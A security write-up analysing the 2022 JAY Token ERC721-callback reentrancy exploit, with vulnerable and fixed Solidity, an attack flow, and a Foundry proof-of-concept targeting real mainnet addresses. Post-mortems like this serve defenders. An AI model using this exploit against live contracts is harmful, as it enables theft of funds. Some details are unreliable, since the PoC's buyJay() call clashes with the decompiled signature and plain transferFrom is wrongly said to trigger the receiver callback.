# JAY — buyJay() ERC721 Callback Reentrancy Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-12 |
| **Protocol** | JAY Token |
| **Chain** | Ethereum |
| **Loss** | ~15.32 ETH |
| **JAY Token** | [0xf2919D1D80Aff2940274014bef534f7791906FF2](https://etherscan.io/address/0xf2919D1D80Aff2940274014bef534f7791906FF2) |
| **Attack Contract** | [0xed42cb11b9d03c807ed1ba9c2ed1d3ba5bf37340](https://etherscan.io/address/0xed42cb11b9d03c807ed1ba9c2ed1d3ba5bf37340) |
| **WETH** | [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2](https://etherscan.io/address/0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) |
| **Balancer Vault** | [0xBA12222222228d8Ba445958a75a0704d566BF2C8](https://etherscan.io/address/0xBA12222222228d8Ba445958a75a0704d566BF2C8) |
| **Root Cause** | The `buyJay()` function is vulnerable to reentrancy via the ERC721 `transferFrom` callback during NFT transfer; by calling `sell()` upon reentry before state is updated, the attacker can sell at a price higher than the original purchase price |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-12/JAY_exp.sol) |

---
## 1. Vulnerability Overview

JAY Token featured a built-in AMM structure that allowed users to buy JAY with ETH (`buyJay()`) or sell JAY for ETH (`sell()`). The `buyJay()` function accepted ETH and transferred JAY tokens along with an NFT using ERC721 `transferFrom`. The attacker deployed a malicious ERC721 contract that re-entered `sell()` from within the `transferFrom` callback. At the point of reentry, the state (bonding curve price) from `buyJay()` had not yet been updated, allowing the attacker to sell JAY at an inflated price. The attacker flash-borrowed 72.5 ETH from Balancer and repeated multiple `buyJay()` + reentrant `sell()` cycles to net approximately 15.32 ETH in profit.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable JAY - buyJay() susceptible to ERC721 callback reentrancy
contract JAYToken {
    uint256 public price;  // bonding curve current price

    // ❌ CEI pattern not followed - external call before state update
    function buyJay() external payable {
        uint256 jayAmount = _calculateJayAmount(msg.value);

        // ❌ NFT transfer (external call) before state update
        // ERC721.transferFrom → triggers callback if recipient is ERC721Receiver
        nft.transferFrom(address(this), msg.sender, tokenId);
        // ↑ If sell() is re-entered from this callback, price is still high

        // ❌ State update only after external call (reentrancy already possible)
        price = _newPrice(price, msg.value, true);
        _mint(msg.sender, jayAmount);
    }

    function sell(uint256 jayAmount) external {
        uint256 ethOut = _calculateEthAmount(jayAmount);
        _burn(msg.sender, jayAmount);
        price = _newPrice(price, ethOut, false);
        payable(msg.sender).transfer(ethOut);
    }
}

// ✅ Correct pattern - CEI pattern + ReentrancyGuard
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract SafeJAYToken is ReentrancyGuard {
    // ✅ nonReentrant modifier blocks reentrancy
    function buyJay() external payable nonReentrant {
        uint256 jayAmount = _calculateJayAmount(msg.value);

        // ✅ State updated first (CEI pattern)
        price = _newPrice(price, msg.value, true);
        _mint(msg.sender, jayAmount);

        // ✅ External call after state update
        nft.transferFrom(address(this), msg.sender, tokenId);
    }
}
```

---
### On-Chain Source Code

Source: Bytecode decompilation


**JAY_decompiled.sol** — Entry points:
```solidity
// ❌ Root cause: `buyJay()` function is vulnerable to reentrancy via the ERC721 `transferFrom` callback during NFT transfer; calling `sell()` upon reentry before state is updated allows selling at a price higher than the original
    function buyJay(address[] arg0, uint256[] arg1, address[] arg2, uint256[] arg3, uint256[] arg4) external {}  // 0x666566e8  // ❌ Vulnerable

    function sell(uint256 arg0) external {}  // 0xe4849b32  // ❌ Vulnerable
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker (implements fake ERC721 receiver)
    │
    ├─[1] Flash loan 72.5 ETH from Balancer Vault
    │       Enters receiveFlashLoan() callback
    │
    ├─[2] Convert WETH → ETH (withdraw)
    │
    ├─[3] buyJay(22 ETH) - first purchase without NFT
    │       Acquires JAY tokens
    │
    ├─[4] buyJay(50.5 ETH) - second purchase with fake ERC721 receiver
    │       ├─ JAY Token calls nft.transferFrom()
    │       ├─ Triggers attack contract's onERC721Received() callback
    │       │
    │       │   [Reentry] sell(jayBalance) called
    │       │       ❌ price still high (buyJay state not yet updated)
    │       │       → Sells JAY at inflated price → receives ETH
    │       │
    │       └─ buyJay() resumes execution (profit already captured)
    │
    ├─[5] buyJay(3.5 ETH) third purchase + reentrant sell()
    │
    ├─[6] buyJay(8 ETH) fourth purchase
    │
    ├─[7] Remaining JAY → sell() final liquidation
    │
    ├─[8] Convert ETH → WETH (deposit)
    │
    ├─[9] Repay Balancer flash loan (72.5 ETH)
    │
    └─[10] Net profit: ~15.32 ETH
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IJay {
    function buyJay() external payable;
    function sell(uint256 amount) external;
    function balanceOf(address) external view returns (uint256);
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] calldata tokens,
        uint256[] calldata amounts,
        bytes calldata userData
    ) external;
}

interface IWETH {
    function withdraw(uint256) external;
    function deposit() external payable;
    function transfer(address, uint256) external returns (bool);
}

contract JAYExploit is Test {
    IJay           jay     = IJay(0xf2919D1D80Aff2940274014bef534f7791906FF2);
    IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IWETH          WETH    = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    bool private attacking; // Reentrancy flag (attacker-side)

    function setUp() public {
        vm.createSelectFork("mainnet", 16_288_199);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] ETH", address(this).balance, 18);

        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 72.5 ether;

        // [Step 1] Balancer 72.5 ETH flash loan
        balancer.flashLoan(address(this), tokens, amounts, "");

        emit log_named_decimal_uint("[End] ETH", address(this).balance, 18);
    }

    function receiveFlashLoan(
        address[] calldata,
        uint256[] calldata amounts,
        uint256[] calldata,
        bytes calldata
    ) external {
        // [Step 2] WETH → ETH
        WETH.withdraw(amounts[0]);

        // [Step 3] First buyJay (without NFT)
        jay.buyJay{value: 22 ether}();

        // [Step 4] Second buyJay - triggers reentrancy attack
        // ⚡ sell() reentered from onERC721Received()
        attacking = true;
        jay.buyJay{value: 50.5 ether}();
        attacking = false;

        // [Steps 5-6] Additional buyJay cycles
        jay.buyJay{value: 3.5 ether}();
        jay.buyJay{value: 8 ether}();

        // [Step 7] Sell remaining JAY
        jay.sell(jay.balanceOf(address(this)));

        // [Step 8] Convert ETH → WETH and repay
        WETH.deposit{value: amounts[0]}();
        WETH.transfer(address(balancer), amounts[0]);
    }

    // ERC721 receive callback - executes reentrancy attack
    function onERC721Received(
        address, address, uint256, bytes calldata
    ) external returns (bytes4) {
        if (attacking) {
            // ⚡ Reenter sell() while buyJay() state is not yet updated
            // Sell JAY at inflated price → profit in ETH
            jay.sell(jay.balanceOf(address(this)));
        }
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | `buyJay()` CEI pattern violation → ERC721 callback reentrancy |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **OWASP DeFi** | Reentrancy Attack |
| **Attack Vector** | Balancer 72.5 ETH flash loan → `buyJay()` × 4 + `onERC721Received()` reentrant `sell()` |
| **Preconditions** | `buyJay()` calls ERC721 `transferFrom` before state update, no `nonReentrant` modifier |
| **Impact** | ~15.32 ETH |

---
## 6. Remediation Recommendations

1. **Apply ReentrancyGuard**: Add OpenZeppelin `ReentrancyGuard`'s `nonReentrant` modifier to both `buyJay()` and `sell()`.
2. **Follow CEI Pattern**: Within `buyJay()`, update state variables (`price`, balances) before executing NFT/token transfers.
3. **Be Cautious with ERC721 Safe Transfers**: When transferring NFTs via `safeTransferFrom()` or `transferFrom()`, a callback is triggered if the recipient is a contract. Since this callback can execute arbitrary code, it must only be invoked after all state updates are complete.

---
## 7. Lessons Learned

- **Reentrancy Risk from ERC721 Callbacks**: Unlike ERC20's `transfer`, ERC721's `safeTransferFrom` and `transferFrom` trigger callbacks on recipient contracts. These callbacks execute arbitrary attacker-controlled code and serve as reentrancy entry points.
- **Special Risk in Bonding Curve AMMs**: In bonding curve AMMs where price changes dynamically with volume, reentrancy creates an opportunity to sell at a higher price before the price update is applied. This yields greater profit than typical reentrancy attacks.
- **Complexity of NFT-Integrated DeFi**: Protocols combining NFTs and DeFi have more external callback paths than ERC20-based protocols. Designers must recognize that every token transfer function can become a reentrancy vector and architect accordingly.